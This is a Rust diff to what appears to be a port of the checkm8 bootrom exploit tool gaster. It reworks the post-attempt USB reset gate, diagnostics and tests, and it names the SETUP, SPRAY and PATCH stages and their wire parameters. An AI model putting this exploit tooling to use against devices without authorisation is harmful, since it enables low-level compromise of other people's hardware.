+// ---------------------------------------------------------------------------
+// The post-attempt reset, and what its evidence is allowed to stop
+// ---------------------------------------------------------------------------
+//
+// gaster resets unconditionally after every stage attempt and **discards** the
+// result (`gaster.c:197-200` is a bare `libusb_reset_device`, `gaster.c:1268`
+// calls it). Ours reads the result, because on Windows libusb returns
+// `LIBUSB_SUCCESS` even when all it did was cycle pipes
+// (`windows_winusb.c:3419`). Reading it is the improvement. Letting a *failed
+// reading* stop the run is not, and that is what this section exists to fix:
+// `ResetEvidence::Unverified` is documented by this crate as "not success; not
+// failure" (`types.rs:387-391`), and treating it as failure aborted every run at
+// round 2 — before SPRAY was ever reached (`docs/VERIFICATION-live-run.md` B1).
+
+/// What the post-attempt reset gate decides, from the measured evidence alone.
+///
+/// Three outcomes, because there are three genuinely different situations —
+/// collapsing them into the old `bool` is what reintroduced the defect
+/// `ResetEvidence` exists to prevent.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum ResetGate {
+    /// Positive evidence a bus reset was delivered: continue.
+    Continue,
+    /// Not success, not failure: continue, but say so loudly. Never silent.
+    ContinueLoudly,
+    /// The device positively contradicts us (`Refuted`) or the driver cannot
+    /// deliver a bus reset at all (`DriverCannotReset`): stop.
+    Stop,
+}
+
+/// The gate. Pure, so all three outcomes are pinned by tests without a device.
+///
+/// * `Delivered` — continue.
+/// * `Unverified` — continue **loudly**. This is the fix for B1: gaster ignores
+///   the result entirely, and `Unverified` covers both "the read failed" and
+///   "idle before, idle after", neither of which is evidence of a
+///   non-delivery. Note that a *genuine* bus reset re-enumerates the device, so
+///   the post-reset `DFU_GETSTATUS` failing is what a working reset can look
+///   like from here.
+/// * `Refuted` — the device was parked in `MANIFEST_WAIT_RESET` and still is:
+///   positive evidence the reset did not take effect. Stop.
+/// * `DriverCannotReset` — WinUSB cannot deliver a bus reset, or interface 0 was
+///   never claimed so libusb skipped the call while returning success. Stop.
+///
+/// `--allow-winusb` keeps its documented role as the operator's override: its
+/// purpose is to reproduce a failure mode deliberately, so it downgrades
+/// `Stop` to `ContinueLoudly` rather than removing the evidence. It is **no
+/// longer needed** to get past `Unverified` — that is the point of the fix.
+pub fn reset_gate(evidence: ResetEvidence, allow_winusb: bool) -> ResetGate {
+    match evidence {
+        ResetEvidence::Delivered => ResetGate::Continue,
+        ResetEvidence::Unverified => ResetGate::ContinueLoudly,
+        ResetEvidence::Refuted | ResetEvidence::DriverCannotReset => {
+            if allow_winusb {
+                ResetGate::ContinueLoudly
+            } else {
+                ResetGate::Stop
+            }
+        }
+    }
+}
+
+/// `bState` as the DFU 1.1 spec numbers it (the same labels `usb.rs:169-170`
+/// uses): 0 appIDLE, 1 appDETACH, 2 dfuIDLE, 3 dfuDNLOAD-SYNC, 4 dfuDNBUSY,
+/// 5 dfuDNLOAD-IDLE, 6 dfuMANIFEST-SYNC, 7 dfuMANIFEST, 8
+/// dfuMANIFEST-WAIT-RESET, 9 dfuUPLOAD-IDLE, 10 dfuERROR.
+///
+/// The `3`/`4`/`10` rows are load-bearing for the `--probe-setup-state`
+/// diagnostic: "still 5" (the ROM never registered the DNLOAD) versus "3/4" (it
+/// did and is mid-transaction) versus "10" (it registered and rejected it) is the
+/// entire result, so they must never render as "other". Pinned by
+/// `the_setup_probe_state_table_is_pinned`.
+fn dfu_state_label(s: u8) -> &'static str {
+    match s {
+        0 => "appIDLE",
+        1 => "appDETACH",
+        2 => "dfuIDLE",
+        3 => "dfuDNLOAD-SYNC",
+        4 => "dfuDNBUSY",
+        5 => "dfuDNLOAD-IDLE",
+        6 => "manifestSync",
+        7 => "manifest",
+        8 => "manifestWaitReset",
+        9 => "dfuUPLOAD-IDLE",
+        10 => "dfuERROR",
+        _ => "other",
+    }
+}
+
+/// The state pair as measured, never as assumed: `None` is *unread*.
+pub fn dfu_state_pair(r: &ResetReport) -> String {
+    let f = |s: Option<u8>| match s {
+        Some(v) => format!("{v} ({})", dfu_state_label(v)),
+        None => "unread".to_string(),
+    };
+    format!("DFU state {} -> {}", f(r.dfu_state_before), f(r.dfu_state_after))
+}
+
+/// One line naming every measured fact about one reset. Used for the predicate
+/// detail, the tracer record and both messages below.
+pub fn reset_facts(when: &str, after: &str, r: &ResetReport) -> String {
+    format!(
+        "when={when} after={after} evidence=\"{}\" rc={} capability=\"{}\" interface_claimed={} {} \
+         micros={} {}",
+        r.evidence.as_str(),
+        r.libusb_rc,
+        r.capability.as_str(),
+        r.interface_claimed,
+        dfu_state_pair(r),
+        r.micros,
+        r.note
+    )
+}
+
+/// The warning line for a reset that continued without proving itself. Pure, so
+/// its content is pinned by a test.
+///
+/// `after` is the stage whose attempt the reset followed. After PATCH the
+/// consequence is different in kind — that reset is the *trigger* that runs the
+/// overwritten `dfu_handle_bus_reset` (`gaster.c:1268`, HANDOFF §8.6) — so the
+/// sentence says so instead of claiming a generic "continue".
+pub fn reset_warning(when: &str, after: &str, r: &ResetReport) -> String {
+    let tail = if after.eq_ignore_ascii_case("PATCH") {
+        "After PATCH this reset is the TRIGGER that runs the overwritten \
+         dfu_handle_bus_reset callback, so if the PWND marker is absent after the re-open, this \
+         line is a candidate cause — and the marker, not this verdict, is the proof either way."
+    } else {
+        "gaster discards this result and resets unconditionally after every attempt \
+         (gaster.c:197-200, :1268), so the run continues rather than stopping the experiment on a \
+         failed reading. If the run fails later, read this line and the reset_unverified events \
+         before blaming the exploit."
+    };
+    format!(
+        "the {when} bus reset (after the {after} attempt) was issued but did not prove itself: \
+         evidence \"{}\", {}. Not success, not failure — continuing. {tail}",
+        r.evidence.as_str(),
+        reset_facts(when, after, r)
+    )
+}
+
+/// The abort sentence for a reset the gate refuses to continue past. Pure.
+pub fn reset_stop_message(when: &str, after: &str, r: &ResetReport, allow_winusb: bool) -> String {
+    let why = match r.evidence {
+        ResetEvidence::Refuted => {
+            "the device says the reset did not take effect (it was parked in manifestWaitReset and \
+             still is), whatever libusb returned"
+        }
+        ResetEvidence::DriverCannotReset => {
+            "the bound driver cannot deliver a host-initiated bus reset, so the reset this exploit \
+             depends on is a no-op"
+        }
+        ResetEvidence::Delivered | ResetEvidence::Unverified => {
+            "the reset evidence was neither positive nor overridable"
+        }
+    };
+    format!(
+        "the {when} bus reset (after the {after} attempt) was not delivered: {why}. Stop — {} \
+         The reset is what both cleans the DFU state and, after PATCH, fires the overwritten \
+         dfu_handle_bus_reset callback (gaster.c:1268), so continuing would be a different \
+         experiment.{}",
+        reset_facts(when, after, r),
+        if allow_winusb {
+            ""
+        } else {
+            " --allow-winusb overrides only to prove the failure."
+        }
+    )
+}
+
+/// Record one reset in the tracer, honestly.
+///
+/// The evidence is handed to the tracer **whole** — `Tracer::reset(evidence,
+/// note)`, authorised by the Lead as the replacement for the old
+/// `reset(bool, note)`. That signature exists precisely so the counters and the
+/// verdict can tell `Unverified` from a pipe cycle; passing a `bool` here would
+/// reproduce the collapse this crate was built to avoid, and would make
+/// `verdict.rs` step 1 answer `NO_RESET_CAPABILITY` for a perfectly good libusbK
+/// driver (`verdict.rs:196-201`).
+///
+/// The gate itself does not depend on this call — it reads
+/// `report.evidence` directly — so the two concerns stay separable.
+fn record_reset(tracer: &mut Tracer, when: &str, after: &str, r: &ResetReport) {
+    tracer.reset(r.evidence, &reset_facts(when, after, r));
+}
+
 /// The bus reset after an attempt (gaster.c:1268), with the report read rather
 /// than trusted (`windows_winusb.c:3419` returns success for a pipe cycle).
-fn reset_device(
+///
+/// One function for both the round loop and the single-stage path, so the two
+/// cannot drift apart — B1 was the same wrong condition written twice
+/// (`stages.rs:1555` and `:1840` before the fix).
+fn reset_after_attempt(
     usb: &mut Transport,
     tracer: &mut Tracer,
     opts: &RunOptions,
     when: &str,
+    after: &str,
 ) -> Result<(), RunOutcome> {
-    match usb.reset() {
-        Ok(report) => {
-            tracer.predicate(
-                Stage::Reset,
-                "bus_reset_delivered",
-                report.bus_reset_delivered,
-                &format!(
-                    "when={when} rc={} capability=\"{}\" interface_claimed={} micros={} {}",
-                    report.libusb_rc,
-                    report.capability.as_str(),
-                    report.interface_claimed,
-                    report.micros,
-                    report.note
-                ),
-            );
-            tracer.reset(
-                report.bus_reset_delivered,
-                &format!(
-                    "when={when} rc={} capability=\"{}\" interface_claimed={} micros={} {}",
-                    report.libusb_rc,
-                    report.capability.as_str(),
-                    report.interface_claimed,
-                    report.micros,
-                    report.note
-                ),
-            );
-            if !report.bus_reset_delivered && !opts.allow_winusb {
-                return Err(RunOutcome::Aborted(format!(
-                    "the {when} bus reset was not delivered (\"{}\", rc={}, \
-                     interface_claimed={}): {}",
-                    report.capability.as_str(),
-                    report.libusb_rc,
-                    report.interface_claimed,
-                    report.note
-                )));
-            }
-            Ok(())
-        }
+    let report = match usb.reset() {
+        Ok(r) => r,
         Err(e) => {
+            // The call itself failed: a third outcome, counted as an attempt
+            // only (`trace::kind::RESET`), never as real and never as a pipe
+            // cycle. gaster ignores this and continues; we stop by default.
             tracer.event(
                 kind::RESET,
                 Some(Stage::Reset),
-                &format!("when={when}: the reset call failed: {e}"),
+                &format!("when={when} after={after}: the reset call failed: {e}"),
             );
             if !opts.allow_winusb {
                 return Err(RunOutcome::Aborted(format!(
-                    "the {when} bus reset failed: {e}"
+                    "the {when} bus reset (after the {after} attempt) failed: {e}. checkm8 needs a \
+                     real reset after every attempt (gaster.c:1268); --allow-winusb overrides only \
+                     to prove the failure."
                 )));
             }
+            return Ok(());
+        }
+    };
+
+    let detail = reset_facts(when, after, &report);
+    tracer.predicate(
+        Stage::Reset,
+        "bus_reset_delivered",
+        report.bus_reset_delivered,
+        &detail,
+    );
+    record_reset(tracer, when, after, &report);
+
+    match reset_gate(report.evidence, opts.allow_winusb) {
+        ResetGate::Continue => Ok(()),
+        ResetGate::ContinueLoudly => {
+            let warning = reset_warning(when, after, &report);
+            tracer.event(
+                "bus_reset_not_proven",
+                Some(Stage::Reset),
+                &format!("{warning} [{}]", report.evidence.as_str()),
+            );
+            println!("  RESET: WARNING - {}", one_line(&warning));
             Ok(())
         }
+        ResetGate::Stop => Err(RunOutcome::Aborted(reset_stop_message(
+            when,
+            after,
+            &report,
+            opts.allow_winusb,
+        ))),
     }
 }
 
@@ -1992,6 +2766,12 @@ fn dry_run_stage(stage: Stage, opts: &RunOptions) -> RunOutcome {
                 );
                 println!(
                     "      pad request = overwrite_pad - delivered, sent as bm=0 b=0 wValue=0 wIndex=0"
+                );
+                println!(
+                    "      pad timeout = {}ms (gaster's usb_timeout by default; ours to move — a \
+                     pad STALL at 20-40ms is the device's EP0 watchdog, NOT evidence of \
+                     corruption)",
+                    pad_timeout(opts)
                 );
                 println!("      PASS CONDITION: STALL on the pad request (gaster.c:853), not OK, not a timeout");
             }
@@ -2133,7 +2913,7 @@ mod tests {
         assert_eq!(window_span(5, 5), 1);
         assert_eq!(sweep_windows(5, 5, 4), vec![4, 5, 5, 5]);
 
-        let mut s = SetupStats::new(0x500, 5, 5);
+        let mut s = SetupStats::new(0x500, 5, 5, 5);
         assert!(s.degenerate);
         s.attempts = 1;
         s.note_window(4);
@@ -2150,7 +2930,7 @@ mod tests {
 
     #[test]
     fn healthy_sweep_never_warns() {
-        let mut s = SetupStats::new(0x500, 5, 0);
+        let mut s = SetupStats::new(0x500, 5, 0, 5);
         assert!(!s.degenerate);
         for (i, w) in [4u32, 5, 0, 1, 2, 3, 4, 5].iter().enumerate() {
             s.attempts = i as u64 + 1;
@@ -2167,7 +2947,7 @@ mod tests {
     /// advance (the a9ctl failure mode) and it must still be reported.
     #[test]
     fn a_span_above_one_that_still_does_not_vary_is_reported() {
-        let mut s = SetupStats::new(0x500, 5, 0);
+        let mut s = SetupStats::new(0x500, 5, 0, 5);
         assert!(!s.degenerate);
         s.attempts = 1;
         s.note_window(4);
@@ -2180,7 +2960,7 @@ mod tests {
 
     #[test]
     fn an_immediate_return_is_flagged_in_the_attempt_line() {
-        let mut s = SetupStats::new(0x500, 5, 0);
+        let mut s = SetupStats::new(0x500, 5, 0, 5);
         s.attempts = 1;
         let abort = XferResult {
             seq: 1,
@@ -2272,6 +3052,78 @@ mod tests {
         assert_eq!(pad_request_len(0x500, 0x800), None);
     }
 
+    /// The gap the analyst named (Q1/Q2): `pad_predicate_matches_gaster_853`
+    /// pins only the **length** half of the predicate, so the STALL requirement
+    /// — which *is* SETUP's success signal and the proof HANDOFF §6.3 exists to
+    /// produce — was pinned by inspection alone. This pins the whole gate, and
+    /// `stage_setup` now calls it.
+    #[test]
+    fn the_setup_pass_condition_is_gaster_853_whole() {
+        let pad = |status: XferStatus| XferResult {
+            seq: 9,
+            bm_request_type: 0,
+            b_request: 0,
+            w_value: 0,
+            w_index: 0,
+            w_length: 0x500,
+            status,
+            transferred: 0,
+            requested: 0x500,
+            micros: 120,
+            libusb_rc: -1,
+            abort_after_ms: None,
+        };
+        // Fewer than overwrite_pad bytes AND a STALL on the pad: pass.
+        assert!(setup_passed(0, 0x500, Some(&pad(XferStatus::Stall))));
+        assert!(setup_passed(0x4FF, 0x500, Some(&pad(XferStatus::Stall))));
+        // A pad that does not STALL is not the pass condition — not OK, not a
+        // timeout, not anything else.
+        for s in [
+            XferStatus::Ok,
+            XferStatus::Timeout,
+            XferStatus::Cancelled,
+            XferStatus::Error,
+            XferStatus::NoDevice,
+        ] {
+            assert!(
+                !setup_passed(0, 0x500, Some(&pad(s))),
+                "{s} is not a STALL"
+            );
+        }
+        // No pad was sent because the aborted transfer delivered >= overwrite_pad:
+        // gaster's `&&` short-circuits there, so the attempt cannot pass.
+        assert!(!setup_passed(0x500, 0x500, None));
+        assert!(!setup_passed(0x800, 0x500, None));
+    }
+
+    /// One pad STALL, counted once. `record_pad` counts it; the pass branch in
+    /// `stage_setup` used to add a second one, so a single successful pad request
+    /// printed `pad_stall=2` in the summary the operator reads. The gate no
+    /// longer touches the counter, and this pins the contract it relies on.
+    #[test]
+    fn one_pad_stall_is_counted_once() {
+        let pad = XferResult {
+            seq: 9,
+            bm_request_type: 0,
+            b_request: 0,
+            w_value: 0,
+            w_index: 0,
+            w_length: 0x500,
+            status: XferStatus::Stall,
+            transferred: 0,
+            requested: 0x500,
+            micros: 120,
+            libusb_rc: -1,
+            abort_after_ms: None,
+        };
+        let mut s = SetupStats::new(0x500, 5, 0, 5);
+        s.attempts = 1;
+        s.record_pad(&pad);
+        assert!(setup_passed(0, 0x500, Some(&pad)));
+        assert_eq!(s.pad_stalls, 1);
+        assert!(s.summary().contains("pad_stall=1"), "{}", s.summary());
+    }
+
     #[test]
     fn stdout_sampling_is_bounded_but_never_silent_at_the_head() {
         let opts = RunOptions::default();
@@ -2304,7 +3156,7 @@ mod tests {
             libusb_rc: -2,
             abort_after_ms: Some(4),
         };
-        let mut s = SetupStats::new(0x500, 5, 0);
+        let mut s = SetupStats::new(0x500, 5, 0, 5);
         s.attempts = 2;
         s.note_window(4);
         s.note_window(4);
@@ -2318,6 +3170,12 @@ mod tests {
         assert!(line.contains("abort_micros=4001"), "{line}");
         assert!(line.contains("pad_req=1280"), "{line}");
         assert!(line.contains("pad_status=TIMEOUT"), "{line}");
+        // Requested vs effective, adjacent, so the deadline's being honoured is
+        // checkable from one line — and the sweep's own timeout is named next to
+        // it so the two numbers cannot be conflated.
+        assert!(line.contains("pad_deadline_ms=5"), "{line}");
+        assert!(line.contains("pad_micros=5002"), "{line}");
+        assert!(line.contains("usb_timeout=5ms"), "{line}");
         assert_eq!(s.windows, vec![4, 5]);
         assert_eq!(s.zero_aborts, 1);
         assert_eq!(s.short_aborts, 1);
@@ -2326,6 +3184,7 @@ mod tests {
         let summary = s.summary();
         assert!(summary.contains("pad_timeout=1"), "{summary}");
         assert!(summary.contains("distinct_abort_windows=2"), "{summary}");
+        assert!(summary.contains("pad_deadline_ms=5ms"), "{summary}");
     }
 
     #[test]
@@ -2344,7 +3203,7 @@ mod tests {
             libusb_rc: -1,
             abort_after_ms: None,
         };
-        let mut s = SetupStats::new(0x500, 5, 0);
+        let mut s = SetupStats::new(0x500, 5, 0, 5);
         s.record_pad(&pad);
         assert_eq!((s.pad_stalls, s.pad_ok, s.pad_timeouts, s.pad_other), (1, 0, 0, 0));
     }
@@ -2364,6 +3223,96 @@ mod tests {
         assert_eq!(o.settle_ms, 0, "0 = gaster's behaviour");
         assert_eq!(o.setup_budget.max_attempts, 20_000);
         assert_eq!(o.setup_budget.max_millis, 600_000);
+    }
+
+    /// The probe's state table, pinned by name for every number it can return.
+    /// The whole result of `--probe-setup-state` is "still 5" versus "3/4" versus
+    /// "10", and this session has already been burned once by a state table that
+    /// rendered distinct states identically — so `3`, `4` and `10` must not be
+    /// `other`.
+    #[test]
+    fn the_setup_probe_state_table_is_pinned() {
+        assert_eq!(dfu_state_label(0), "appIDLE");
+        assert_eq!(dfu_state_label(1), "appDETACH");
+        assert_eq!(dfu_state_label(2), "dfuIDLE");
+        assert_eq!(dfu_state_label(3), "dfuDNLOAD-SYNC");
+        assert_eq!(dfu_state_label(4), "dfuDNBUSY");
+        assert_eq!(dfu_state_label(5), "dfuDNLOAD-IDLE");
+        assert_eq!(dfu_state_label(6), "manifestSync");
+        assert_eq!(dfu_state_label(7), "manifest");
+        assert_eq!(dfu_state_label(8), "manifestWaitReset");
+        assert_eq!(dfu_state_label(9), "dfuUPLOAD-IDLE");
+        assert_eq!(dfu_state_label(10), "dfuERROR");
+        assert_eq!(dfu_state_label(11), "other");
+        assert_eq!(dfu_state_label(0xFF), "other");
+
+        // Off by default: the shipped sequence stays byte-identical to gaster's.
+        assert!(!RunOptions::default().probe_setup_state);
+
+        // The tally keeps unread separate from any real state, and reads the
+        // distribution out of the last probe line of a sweep.
+        let mut s = SetupStats::new(0x500, 5, 0, 5);
+        assert_eq!(s.probe_tally_line(), "-");
+        s.record_probe(Some(5));
+        s.record_probe(Some(5));
+        s.record_probe(Some(4));
+        s.record_probe(None);
+        let tally = s.probe_tally_line();
+        assert!(tally.contains("4 (dfuDNBUSY)=1"), "{tally}");
+        assert!(tally.contains("5 (dfuDNLOAD-IDLE)=2"), "{tally}");
+        assert!(tally.contains("unread=1"), "{tally}");
+        assert!(!tally.contains("other"), "{tally}");
+    }
+
+    /// The pad's timeout is a parameter of its own and must stay independent of
+    /// the abort window, in both directions. The **default is gaster's 5 ms** so
+    /// that SETUP cannot manufacture a false pass (the device's EP0 watchdog
+    /// STALLs a stuck request at 21-37 ms — see `RunOptions::pad_timeout_ms`),
+    /// while `--pad-timeout-ms` can still move it deliberately. If a refactor ever
+    /// re-couples the two, this fails: raising `usb_timeout_ms` to give the pad
+    /// time would let the 2048-byte DNLOAD complete and destroy the sweep.
+    #[test]
+    fn the_pad_timeout_is_independent_of_the_abort_window() {
+        let o = RunOptions::default();
+        assert_eq!(pad_timeout(&o), 5, "gaster's value, so a false pass is not the default");
+        assert_eq!(o.timeout_ms(), 5, "the abort window base is still gaster's");
+        assert_eq!(
+            (o.usb_timeout_ms, o.pad_timeout_ms),
+            (DEFAULT_USB_TIMEOUT_MS, DEFAULT_PAD_TIMEOUT_MS)
+        );
+
+        // The two defaults are equal by design; independence is proven by moving
+        // each value and checking the other does not follow.
+        let wide_pad = RunOptions {
+            pad_timeout_ms: 123,
+            ..RunOptions::default()
+        };
+        assert_eq!(pad_timeout(&wide_pad), 123);
+        assert_eq!(wide_pad.timeout_ms(), 5);
+        assert_eq!(
+            sweep_windows(wide_pad.timeout_ms(), wide_pad.abort_timeout_min_ms, 3),
+            vec![4, 5, 0],
+            "a big pad timeout must not touch the sweep"
+        );
+
+        let wide_abort = RunOptions {
+            usb_timeout_ms: 20,
+            ..RunOptions::default()
+        };
+        assert_eq!(wide_abort.timeout_ms(), 20);
+        assert_eq!(pad_timeout(&wide_abort), 5, "the pad keeps its own value");
+        assert_eq!(
+            sweep_windows(wide_abort.timeout_ms(), wide_abort.abort_timeout_min_ms, 3),
+            vec![19, 20, 0],
+            "and the pad timeout must not touch the sweep either"
+        );
+
+        // 0 is not a legal transfer timeout; it is treated as 1, like the window.
+        let zero = RunOptions {
+            pad_timeout_ms: 0,
+            ..RunOptions::default()
+        };
+        assert_eq!(pad_timeout(&zero), 1);
     }
 
     #[test]
@@ -2424,5 +3373,451 @@ mod tests {
         assert!(e.is_none(), "A9 configs must have large_leak == 0");
         let h = crate::config::all_configs().iter().find(|c| c.hole != 0);
         assert!(h.is_none(), "A9 configs must have hole == 0 (gaster.c:905)");
+    }
+
+    // -- the post-attempt reset gate ---------------------------------------
+    //
+    // B1 was: `Unverified` — which this crate documents as "not success; not
+    // failure" (`types.rs:387-391`) — was gated on as if it were failure, in two
+    // places, so the run aborted at round 2 and SPRAY/PATCH were unreachable.
+    // These tests pin the replacement policy. The gate is pure and the call
+    // sites call it, so the wiring cannot silently diverge from the tests.
+
+    /// A reset fixture with the shape each evidence variant actually produces.
+    /// `libusb_rc = 0` is `LIBUSB_SUCCESS`; `bus_reset_delivered` is what
+    /// `usb.rs:1081` derives from the evidence.
+    fn reset_report(evidence: ResetEvidence) -> ResetReport {
+        let (before, after, capability, claimed, note) = match evidence {
+            ResetEvidence::Delivered => (
+                Some(8u8),
+                Some(0u8),
+                ResetCapability::Real,
+                true,
+                "parked in manifestWaitReset, read back idle",
+            ),
+            ResetEvidence::Refuted => (
+                Some(8u8),
+                Some(8u8),
+                ResetCapability::Real,
+                true,
+                "still parked in manifestWaitReset",
+            ),
+            // What the live device produced after RESET: gaster's own trailing
+            // 64-byte flush (`gaster.c:840`) unparks the machine to state 5
+            // before the reset is taken.
+            ResetEvidence::Unverified => (
+                Some(5u8),
+                Some(5u8),
+                ResetCapability::Real,
+                true,
+                "unchanged, effect unverified",
+            ),
+            ResetEvidence::DriverCannotReset => (
+                None,
+                None,
+                ResetCapability::PipeCycleOnly,
+                false,
+                "driver cannot reset",
+            ),
+        };
+        ResetReport {
+            libusb_rc: 0,
+            interface_claimed: claimed,
+            dfu_state_before: before,
+            dfu_state_after: after,
+            capability,
+            evidence,
+            bus_reset_delivered: evidence == ResetEvidence::Delivered,
+            micros: 1234,
+            note: note.to_string(),
+        }
+    }
+
+    /// REQUIRED TEST 1: an `Unverified` post-stage reset does **not** abort — and
+    /// it is not silent either.
+    #[test]
+    fn unverified_post_stage_reset_does_not_abort() {
+        assert_eq!(
+            reset_gate(ResetEvidence::Unverified, false),
+            ResetGate::ContinueLoudly
+        );
+        let w = reset_warning(
+            "post-stage",
+            "SETUP",
+            &reset_report(ResetEvidence::Unverified),
+        );
+        assert!(w.contains("did not prove itself"), "{w}");
+        assert!(w.contains("issued, effect unverified"), "{w}");
+        assert!(w.contains("DFU state 5 (dfuDNLOAD-IDLE) -> 5 (dfuDNLOAD-IDLE)"), "{w}");
+        assert!(w.contains("gaster.c:197-200"), "the reference continues: {w}");
+        assert!(w.contains("reset_unverified"), "{w}");
+    }
+
+    /// REQUIRED TEST 2: `Refuted` — the device positively contradicts us — aborts.
+    #[test]
+    fn refuted_post_stage_reset_aborts() {
+        assert_eq!(reset_gate(ResetEvidence::Refuted, false), ResetGate::Stop);
+        let m = reset_stop_message(
+            "post-stage",
+            "PATCH",
+            &reset_report(ResetEvidence::Refuted),
+            false,
+        );
+        assert!(m.contains("STOP") || m.contains("Stop"), "{m}");
+        assert!(m.contains("REFUTED by the device"), "{m}");
+        assert!(m.contains("manifestWaitReset"), "{m}");
+        assert!(m.contains("--allow-winusb overrides"), "{m}");
+    }
+
+    /// REQUIRED TEST 3: a driver that cannot deliver a bus reset aborts.
+    #[test]
+    fn driver_cannot_reset_aborts() {
+        assert_eq!(
+            reset_gate(ResetEvidence::DriverCannotReset, false),
+            ResetGate::Stop
+        );
+        let m = reset_stop_message(
+            "post-stage",
+            "SETUP",
+            &reset_report(ResetEvidence::DriverCannotReset),
+            false,
+        );
+        assert!(m.contains("cannot deliver a host-initiated bus reset"), "{m}");
+    }
+
+    /// `Delivered` continues, and `--allow-winusb` keeps its documented role —
+    /// reproduce a failure deliberately — without being the only route past
+    /// `Unverified`.
+    #[test]
+    fn a_delivered_reset_continues_and_the_flag_only_downgrades_a_stop() {
+        assert_eq!(
+            reset_gate(ResetEvidence::Delivered, false),
+            ResetGate::Continue
+        );
+        assert_eq!(
+            reset_gate(ResetEvidence::Delivered, true),
+            ResetGate::Continue
+        );
+        assert_eq!(
+            reset_gate(ResetEvidence::Refuted, true),
+            ResetGate::ContinueLoudly
+        );
+        assert_eq!(
+            reset_gate(ResetEvidence::DriverCannotReset, true),
+            ResetGate::ContinueLoudly
+        );
+    }
+
+    /// The recording must land in the counters `verdict.rs` reads: an
+    /// `Unverified` reset is not a pipe cycle and not a refutation. Passing a
+    /// `bool` here is what used to make the verdict blame the driver.
+    #[test]
+    fn the_reset_counters_follow_the_evidence() {
+        let mut t = Tracer::new(None, false).expect("a tracer with no sink");
+        record_reset(
+            &mut t,
+            "post-stage",
+            "SETUP",
+            &reset_report(ResetEvidence::Unverified),
+        );
+        let c = t.counters();
+        assert_eq!(c.resets_attempted, 1);
+        assert_eq!(c.resets_real, 0);
+        assert_eq!(c.resets_unverified, 1);
+        assert_eq!(c.resets_pipe_cycle, 0, "unverified is not a pipe cycle");
+        assert_eq!(c.resets_refuted, 0);
+
+        let mut t = Tracer::new(None, false).expect("a tracer with no sink");
+        record_reset(
+            &mut t,
+            "post-stage",
+            "PATCH",
+            &reset_report(ResetEvidence::Delivered),
+        );
+        let c = t.counters();
+        assert_eq!((c.resets_attempted, c.resets_real), (1, 1));
+
+        let mut t = Tracer::new(None, false).expect("a tracer with no sink");
+        record_reset(
+            &mut t,
+            "post-stage",
+            "PATCH",
+            &reset_report(ResetEvidence::Refuted),
+        );
+        let c = t.counters();
+        assert_eq!(
+            (c.resets_attempted, c.resets_refuted, c.resets_pipe_cycle),
+            (1, 1, 0)
+        );
+    }
+
+    /// A state that was never read is rendered as unread, never guessed — and a
+    /// machine that moved somewhere unexpected is shown as what it measured.
+    #[test]
+    fn an_unread_state_is_rendered_as_unread() {
+        let unread = ResetReport {
+            dfu_state_before: None,
+            dfu_state_after: None,
+            ..reset_report(ResetEvidence::Unverified)
+        };
+        assert_eq!(dfu_state_pair(&unread), "DFU state unread -> unread");
+        assert!(
+            reset_facts("post-stage", "SETUP", &unread).contains("dfu_state")
+                || reset_facts("post-stage", "SETUP", &unread).contains("DFU state unread"),
+            "{}",
+            reset_facts("post-stage", "SETUP", &unread)
+        );
+        let moved = ResetReport {
+            dfu_state_before: Some(8),
+            dfu_state_after: Some(6),
+            ..reset_report(ResetEvidence::Unverified)
+        };
+        assert_eq!(
+            dfu_state_pair(&moved),
+            "DFU state 8 (manifestWaitReset) -> 6 (manifestSync)"
+        );
+    }
+
+    // -- the diagnostic stop (HANDOFF §6.3) --------------------------------
+
+    /// The flag used to be honoured only by the round loop, so
+    /// `run --stage setup --stop-after-setup-stall` reported a reset refusal
+    /// instead of the SETUP proof. One predicate, both paths.
+    #[test]
+    fn the_diagnostic_stop_fires_only_for_a_passed_setup() {
+        let on = RunOptions {
+            stop_after_setup_stall: true,
+            ..RunOptions::default()
+        };
+        assert!(setup_stall_stop_requested(Stage::Setup, true, &on));
+        assert!(
+            !setup_stall_stop_requested(Stage::Setup, false, &on),
+            "a failed SETUP is not the proof"
+        );
+        assert!(!setup_stall_stop_requested(Stage::Spray, true, &on));
+        assert!(!setup_stall_stop_requested(Stage::Reset, true, &on));
+        assert!(!setup_stall_stop_requested(
+            Stage::Setup,
+            true,
+            &RunOptions::default()
+        ));
+    }
+
+    #[test]
+    fn the_diagnostic_stop_message_names_the_proof_and_what_was_skipped() {
+        let m = match setup_stall_stop_outcome(37, 1) {
+            RunOutcome::Aborted(m) => m,
+            other => panic!("{other:?}"),
+        };
+        assert!(m.contains("--stop-after-setup-stall"), "{m}");
+        assert!(m.contains("gaster.c:853"), "{m}");
+        assert!(m.contains("37 attempt(s)"), "{m}");
+        assert!(m.contains("1 pad STALL(s)"), "{m}");
+        assert!(
+            m.contains("gaster.c:1268"),
+            "the mandatory post-attempt reset still happened: {m}"
+        );
+        assert!(m.contains("SPRAY and PATCH were not attempted"), "{m}");
+        assert!(m.contains("not pwned"), "{m}");
+    }
+
+    // -- SPRAY's wire parameters and predicate (B2, B3, B4) ----------------
+
+    /// B2: gaster builds `wValue` from the cached
+    /// `device_descriptor.i_serial_number` (`gaster.c:866`) and never re-reads
+    /// it. The mapping is pure now, so no live `GET_DESCRIPTOR` can creep back
+    /// into the loop (`usb.rs:472` forbids it there).
+    #[test]
+    fn leak_wvalue_is_gasters_value_mapping() {
+        assert_eq!(leak_wvalue(0), 0x0300);
+        assert_eq!(leak_wvalue(4), 0x0304, "the declared index (gaster.c:866)");
+        assert_eq!(leak_wvalue(0x0A), 0x030A);
+        assert_eq!(leak_wvalue(0xFF), 0x03FF);
+    }
+
+    /// B3: a transfer the transport refused was never submitted, so it cannot
+    /// stand in for gaster's `completed != 0` clause (`gaster.c:282`). Without
+    /// this, a device that died between the stall and the leak scored both the
+    /// leak and the no-leak as successes and SPRAY returned `Pass` on a dead
+    /// handle.
+    #[test]
+    fn a_refused_leak_is_not_a_successful_leak() {
+        let base = XferResult {
+            seq: 1,
+            bm_request_type: 0x80,
+            b_request: 6,
+            w_value: 0x0304,
+            w_index: LEAK_WINDEX_GASTER,
+            w_length: EP0_MAX_PACKET_SZ,
+            status: XferStatus::Ok,
+            transferred: 0,
+            requested: EP0_MAX_PACKET_SZ as usize,
+            micros: 900,
+            libusb_rc: 0,
+            abort_after_ms: Some(1),
+        };
+        assert!(
+            leak_satisfied(&base),
+            "zero bytes after a real transfer is the reference's success"
+        );
+        assert!(abort_completed(&base) && !abort_was_refused(&base));
+
+        // Reaped, but with bytes: gaster requires zero (`gaster.c:866`).
+        assert!(!leak_satisfied(&XferResult {
